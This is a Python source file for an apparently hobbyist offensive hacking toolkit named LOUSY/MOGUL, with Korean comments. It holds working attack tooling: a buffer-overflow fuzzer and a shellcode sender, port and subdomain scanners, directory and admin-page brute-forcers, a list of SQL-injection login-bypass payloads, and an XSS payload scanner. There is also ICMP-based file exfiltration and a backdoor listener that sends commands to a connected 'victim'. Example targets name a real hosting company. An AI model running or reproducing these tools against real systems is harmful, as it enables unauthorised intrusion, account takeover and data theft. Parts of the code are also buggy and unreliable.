#All made by 2gis
#All made of Python3

#참고 서적
#>>>『파이썬 해킹 레시피』
#>>>『모의 침투 입문자를 위한 파이썬3 활용』

#======================== Code ========================#	

import socket
import os
import struct
from scapy.all import*
import string
import random
import urllib.request
from time import time
import asyncio
import aiohttp
import requests
import copy
from bs4 import BeautifulSoup, SoupStrainer
from functools import partial
import sys
from urllib.request import build_opener, HTTPCookieProcessor
import http.cookiejar as cookielib
from html.parser import HTMLParser
from urllib.parse import urlencode
import errno
import time
from urllib.parse import urlparse
from pythonping import ping
import base64
from datetime import date
from utils.display import delay_print

def MoGuL():
	print()
	while True:

		def fuzzer():

			print("="*50)
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(op1), int(op2)))
			s.settimeout(0.5)
			msg = ("A"*int(op3))
			s.sendall(msg.encode('utf-8'))
			try:
				s.recv(65565)
			except socket.timeout:
				print("Pass!!!\n"+"="*50)
				s.close()
			else:
				print("Buffer Error Occured!!!\n"+"="*50)

			s.close()

		def snf():
        
			def showPacket(packet):  
				a = packet.show()  
				print(a)
				print("================================")

			def sniffing(filter):  
				sniff(filter = filter, prn = showPacket, count = int(op3))


			if __name__ == '__main__':  
				filter = 'ip'  
				print("================================")
				sniffing(filter)  
				
		def ipconfig():
			a=("Host Name ",socket.gethostname())
			b=("IP Address(Internal) : ",socket.gethostbyname(socket.gethostname()))
			c=("IP Address(External) : ",socket.gethostbyname(socket.getfqdn()))

			print(a)
 
			print(b)
 
			print(c)

		
		def portscan():
			ports = [0,1,5,7,9,11,13,15,17,18,19,20,21,\
			22,23,25,28,37,42,43,47,49,51,52,53,54,56,58,\
			61,67,68,69,70,71,72,73,74,79,80,81,82,83,88,90,\
			95,101,102,104,105,107,108,109,110,113,115,117,118,\
			119,123,126,135,147,138,139,143,152,153,156,158,161,\
			162,170,177,179,194,199,201,209,210,213,218,220,\
			225,226,227,228,229,230,231,232,233,234,235,236,\
			237,238,239,240,241,249,250,251,252,253,254,255,259,\
			262,264,280,300,308,311,319,320,350,351,383,369,\
			384,399,401,427,434,443,444,445,464,465,500,510,\
			514,524,540,548,631,636,655,660,666,981,990,992,\
			993,995,1311,1513,2083,3306,3389,5228,5353,8008,\
			8080,12000]#155개
			st = time.time()
			if op2 == "-a":

				for port in ports:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
						s.settimeout(0.0001)
						result = s.connect_ex((str(op1), port))

						if result == 0:	
							print("[_] Udp Port " + str(port) + " is opened")

						s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s1.settimeout(0.0001)
						result = s1.connect_ex((str(op1), port))

						if result == 0:
							print("[+] Tcp Port " + str(port) + " is opened")

					except socket.timeout:
						continue
				s.close()
				s1.close()
				et = time.time()
				ft = et-st
				if op3 == "-f":
					print("Finished in :",ft)

			if op2 == "-t":
				for port in ports:
					try:
						s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s1.settimeout(0.0001)
						result = s1.connect_ex((str(op1), port))

						if result == 0:
							print("[+] Tcp Port " + str(port) + " is opened")

					except socket.timeout:
						continue
				s1.close()
				et = time.time()
				ft = et-st
				if op3 == "-f":
					print("Finished in :",ft)

		def anurl():
			ports = [22, 80, 443, 445, 8080]
			scan_target = input("Input like[cafe24.com] : ")	

			async def async_func():
				futures = [asyncio.ensure_future(port_scan(port)) for port in ports]
				results = await asyncio.gather(*futures)
				for result in results:
					if result["Open"]:
						print(result)


			async def port_scan(port):
				tcp_request = partial(try_connect, port)
				resp = await loop.run_in_executor(None, tcp_request)
				return {"Port": port, "Open": resp[1], "Banner": resp[2]}


			def try_connect(port):
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(2)

				try:
					sock.connect((scan_target, port))
					sock.send("hello".encode())
					data = sock.recv(100).decode("utf-8", "replace")
					sock.close()
					return (port, True, data)

				except Exception as e:
					return (port, False, "")
				finally:
					sock.close()


			if __name__ == "__main__":
				begin = time()
				print(f"Target Address: {scan_target}")
				print(f"Target Ports: {ports}")
				loop = asyncio.get_event_loop()
				loop.run_until_complete(async_func())
				loop.close()
				end = time()
				print(f"finished in : {end - begin}")

		def webscan1():
			wordlist_path = "./never_open_it_subdomains.txt"
			target_domain = input("Input like[cafe24.com] : ")


			async def asnyc_func(domains):
				conn = aiohttp.TCPConnector(limit_per_host=10)
				async with aiohttp.ClientSession(connector=conn) as s:
					futures = [
						asyncio.create_task(discover_url(s, f"http://{domain}.{target_domain}"))
						for domain in domains
					]
					results = await asyncio.gather(*futures)

			async def discover_url(s, domain):
				try:
					async with s.get(domain) as r:
						if r.status == 200:
							output = (domain, r.status)
							print(output)
							return output
						else:
							raise Exception("status_code", r.status)
				except aiohttp.client_exceptions.ClientConnectionError as e:
					# Get Address info failed Error...
					pass
				except Exception as e:
					status_code, error_status = e.args
					output = (domain, error_status)
					print(output)
					return output


			if __name__ == "__main__":
				begin = time.time()
				subdomain_words = open(wordlist_path).read().splitlines()
				asyncio.run(asnyc_func(subdomain_words))
				end = time.time()
				print(f"finished in : {end - begin}")

		def webscan2():
			target_domain = input("Input like[https://cafe24.com] : ")
			results = set()


			def check_target_domain(domain):
				if domain[-1] == "/":
					return domain[:-1]
				else:
					return domain


			def discover_directory(domain):
				hrefs = set()
				try:
					content = requests.get(domain).content
				except requests.exceptions.ConnectionError:
					pass
				except Exception as e:
					print(f"Requets error: {e}")
				for link in BeautifulSoup(
					content, features="html.parser", parse_only=SoupStrainer("a")
				):
					if hasattr(link, "href"):
						try:
							path = link["href"]
							if (
								path.startswith("#")
								or path.startswith("javascript")
								or path.endswith(".jpg")
								or path.endswith(".png")
								or path.endswith(".css")
								or path.endswith(".js")
							):
								continue
							elif path.startswith("/") or path.startswith("?"):
								hrefs.add(f"{target_domain}{path}")
							elif target_domain not in path and path[:4] != "http":
								hrefs.add(f"{target_domain}/{path}")
							else:
								hrefs.add(path)
						except KeyError:
							pass
						except Exception as e:
							print(f"Error when parsing: {e}")
				
				for href in hrefs:
					if href.startswith(target_domain):
						results.add(href)


			if __name__ == "__main__":
				target_domain = check_target_domain(target_domain)
				discover_directory(target_domain)
				links = copy.deepcopy(results)
				print(f"Start Scanning on {len(links)} Links...")
				for link in links:
					print(f"Searching on ... {link}")
					links.add(link)
					discover_directory(link)
				print(f"{results}")
				print(f"Found {len(results)} Links !!!")	

		def web_directory_scan():
			directory_list_path = "./never_open_it_wp-directory.txt"
			target_domain = input("Input like[https://cafe24.com] : ")


			async def asnyc_func(directory_list):
				conn = aiohttp.TCPConnector(limit_per_host=10)
				async with aiohttp.ClientSession(connector=conn) as s:
					futures = [
						asyncio.create_task(find_directory(s, f"{target_domain}/{directory}"))
						for directory in directory_list
					]
					results = await asyncio.gather(*futures)

			async def find_directory(s, sub_directory_path):
				try:
					async with s.get(sub_directory_path) as r:
						if r.status == 200:
							output = (sub_directory_path, r.status)
							print(output)
							return output
						elif r.status == 404:
							pass
						else:
							raise Exception("status_code", r.status)
				except aiohttp.client_exceptions.ClientConnectionError as e:
					pass
				except Exception as e:
					status_code, error_status = e.args
					output = (sub_directory_path, error_status)
					print(output)
					return output

			if __name__ == "__main__":
				begin = time.time()
				directory_list = open(directory_list_path).read().splitlines()
				asyncio.run(asnyc_func(directory_list))
				end = time.time()
				print(f"finished in : {end - begin}")

		def shell():
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(op1), int(op2)))
			length = input("Enter length like[65535] : ")
			buff = "A"*int(length)
			shell = input("Input shellcode : ")

			s.sendall((buff+shell).encode())
			print("Shellcode is sent !")#효과는 미미했다!
			data = s.recv(65535)
			print(data)

		def sqli():
			sqlcodes = [\
			'\'', \
			'*;--', \
			'*#'
			'*'
			'--', \
			'/*', \
			'"', \
			"\\", \
			"')", \
			"';", \
			'"', \
			'")', \
			'";', \
			"`", \
			"`)", \
			"`;", \
			"\\", \
			"%27", \
			"%%2727", \
			"%25%27", \
			"%60", \
			"%5C", \
			'\' OR \'1\' = \'1\'',\
			'\' OR \'1\' = \'1\'#', \
			'admin\'--', \
			'admin;--', \
			'admin\';--', \
			'admin\'#', \
			'admin;#', \
			'admin\' OR \'1\' = \'1\';--', \
			'admin\' OR \'1\' = \'1\';#', \
			'admin\' OR \'1\' = \'1\'#', \
			'admin\' OR \'1\' = \'1\'--', \
			'\' OR \'1\' = \'1\';--', \
			'\' OR \'1\' = \'1\'#', \
			'\' OR \'1\' = \'1\';#']

			targeturl = input('Url like[https://ec.cafe24.com/] : ')
			targetpost = input('Post like[https://eclogin.cafe24.com/Shop/] : ')
			print("="*50)
			username_field = 'admin'
			pass_field = 'pwd'
			check = 'update'

			class myHTMLParser(HTMLParser):
				def __init__(self):
					HTMLParser.__init__(self)
					self.tagResult = {}
			
				def handle_starttag(self, tag, attrs):
					if tag == 'input':
						tagname = None
						tagvalue = None
						for name, value in attrs:
							if name == 'name':
								tagname = value
							if name == 'value':
								tagvalue = value
					
						if tagname is not None:
							self.tagResult[tagname] = tagvalue		

			def findsql():
				web = requests.get(str(targetpost))
				s = BeautifulSoup(web.content, "html.parser")
				re = "sql"
				re1 = "$_sql"
				if re or re1 in soup:
					ok = "\n\"sql\" Found\n"
				else:
					ok = "\n\"sql\" Not Found\n"

				if op1 == "-f":
					if op2 == "-h":
						if op3 == "-sql":
							print(ok)


			def webAuthCracker(username):
				try:
					password = ''
					cookies = cookielib.FileCookieJar('cookies')
					opener = build_opener(HTTPCookieProcessor(cookies))
					res = opener.open(targeturl)
					htmlpage = res.read().decode()
		
		
					parseR = myHTMLParser()
					parseR.feed(htmlpage)		

					inputtags = parseR.tagResult
					inputtags[username_field] = username
					inputtags[pass_field] = password
		
					loginData = urlencode(inputtags).encode('utf-8')
					loginRes = opener.open(targetpost, data=loginData)
					loginResult = loginRes.read().decode()
		
					if check in loginResult:#혹시몰라 만듬.이걸 오류로 생각하고 만들었는데;;
						print('\n---CRACKING SUCCESS!')
						print('---SQL INJECTION [%s]' %username)			
				except Exception as ex:#이게 ㄹㅇ오류인듯
					print(f"[!] [{username}]")
					print()
					pass

			def main():
				print('[+] SQL INJECTION START...')
				print('[+] Trying Somethon...')
				for sqlcode in sqlcodes:
					webAuthCracker(sqlcode)	
		
			if __name__ == '__main__':
				findsql()
				main()
				
			print("="*50)

		def xss_scaner():
			try:
				directory_list_path = "./never_open_it_xss_payloads.txt"
				target_domain = input("Input like[https://cafe24.com] : ")


				async def asnyc_func(directory_list):
					conn = aiohttp.TCPConnector(limit_per_host=10)
					async with aiohttp.ClientSession(connector=conn) as s:
						futures = [
							asyncio.create_task(find_directory(s, f"{target_domain}/{directory}"))
							for directory in directory_list
						]
						results = await asyncio.gather(*futures)

				async def find_directory(s, sub_directory_path):
					try:
						async with s.get(sub_directory_path) as r:
							if r.status == 200:
								output = (sub_directory_path, r.status)
								print(output)
								return output
							elif r.status == 404:
								pass
							else:
								raise Exception("status_code", r.status)
					except aiohttp.client_exceptions.ClientConnectionError as e:
						pass
					except Exception as e:
						status_code, error_status = e.args
						output = (sub_directory_path, error_status)
						print(output)
						return output

				if __name__ == "__main__":
					begin = time.time()
					directory_list = open(directory_list_path).read().splitlines()
					asyncio.run(asnyc_func(directory_list))
					end = time.time()
					print(f"finished in : {end - begin}")

			except Exception as e:
				pass	

		def mogul():
			name = (socket.gethostname())
			print("="*50)
			print("Easter Egg Cracked ! ! !")
			print("'"+name+"'"+",I will remember.")
			print("Thanks for using MOGUL ! ! !")
			print("(/≧▽≦)/")
			print("="*50)

		def admin():
			st = time.time()
			session_id = 'JSESSIONID'
			session_value = '8F9393F17A57071985653EE47CA'
			cookies = {session_id : session_value}

			f = open("./never_open_it_adminpage.txt",'r')
			number = 0
			k = 0
			attack = []
			find_admin = []
			lines = f.readlines()
			for i in lines:
				try:
					attack.append(i[:-1])
					url_input = op1
					url = str(op1)+str(attack[k])
					time.sleep(0.000001)
					res = requests.get(url, cookies = cookies)
					if res.status_code == 200:
						find_admin.append(url)
						print(url)
						print('+++++ find admin +++++')
					if res.status_code != 404:
						print("failed : "+str(attack[k]))
					k = k+1
				except socket.timeout:
					print("timed out")
					pass

			et = time.time()
			ft = et-st
			if find_admin == None:
				print("no admin")
			else:
				print(find_admin)
			print(ft)

		def ipaddr():
			url = str(op1)
			o = urlparse(url)
			hostname = o.hostname
			port = o.port or (443 if o.scheme == "https" else 80)
			ipaddr = socket.getaddrinfo(hostname,port)[0][4][0]
			print(ipaddr)

		def send_file():#불확실
			print("="*30)
			url = input("Input host url : ")
			host = socket.gethostbyname(str(url))
			file = input("Input file as [send_logo.png]: ")
			ff = "./"+str(file)
			with open(str(ff), "rb") as f:
				byte = f.read(4096)
				if byte == b"":  # EOF, Null
					ping(str(host), verbose=False, count=1, payload=b"EOF")
					print("Error")
				send_file = ping(str(host), verbose=False, count=1, payload=byte)
				print(send_file)
				print("="*30)
		
		try:
			cmd, op1, op2, op3 = input('root@mogul:~$ ').split()

			if cmd == "fuzz":
				fuzzer()
			if cmd == "snf":
				snf()
			if cmd == "ipcg":
				ipconfig()
			if cmd == "pscn":
				portscan()
			if cmd == "anurl":
				anurl()
			if cmd == "webscn1":
				webscan1()
			if cmd == "webscn2":
				webscan2()
			if cmd == "shell":
				shell()
			if cmd == "sqli":
				sqli()
			if cmd == "mogul" or "MOGUL":
				if op1 == "is":
					if op2 == "very":
						if op3 == "nice":
							mogul()
			if cmd == "fmod":
				admin()
			if cmd == "ipaddr":
				ipaddr()
			if cmd == "sendf":
				send_file()
			if cmd == "webdir":
				web_directory_scan()
			if cmd == "xss":
				xss_scaner()
			if cmd == "exit":
				break

		except IndexError:
			pass

		except ValueError:
			pass

		except KeyboardInterrupt:
			break

def backdoor():
	def set_sock(ip, port):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind((ip, port))
		s.listen(1)
		conn, addr = s.accept()
		return conn, addr

	def command(conn, addr):
		print("[+] Connected to", addr)
		while True:
			print()
			try:
				command = input(">>>")
				if command == "exit":
					conn.send(b"exit")
					conn.close()
					break
				elif command == "":
					print("Input command...")
				else:
					conn.send(command.encode())
					output = conn.recv(65535)
					print(output.decode("euc-kr", "ignore"), end="")
		
			except IndexError:
				pass

	if __name__ == "__main__":
		print()
		delay_print("[_] Waiting Victim...")
		ip = "0.0.0.0"
		port = 1
		try:
			conn, addr = set_sock(ip, port)
		except KeyboardInterrupt:
			raise SystemExit

		command(conn, addr)

def start():
	try:
		today = date.today()
		year = today.year
		month = today.month
		day = today.day
		now = time.localtime()
	
		print(" ___")
		print("__H__")
		print(" [|] ___  _   _  ___  _   _   {1.1.7 #dev}")
		print(" [-]| . || | | ||_ -|| | | |")
		print(" [.]|__,  `_V_/ |___|` ` / /")
		print("                       `/ /")
		print()
		delay_print("[!] legal disclaimer : Usage of LOUSY for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program")
		print("\n")
		delay_print("[*] starting @ %02d:%02d:%02d /%04d-%02d-%02d/\n" % (now.tm_hour, now.tm_min, now.tm_sec, now.tm_year, now.tm_mon, now.tm_mday))
		print()
		try:
			option = sys.argv[1]
			if option == "--mogul":
				MoGuL()
			elif option == "--backdoor":
				backdoor()
			else:
				print("[!] ")

		except IndexError:
			delay_print("[!] Usage 'python LOUSY [option]'\n")

			raise SystemExit

	except KeyboardInterrupt:
		raise SystemExit

start()


#======================================================#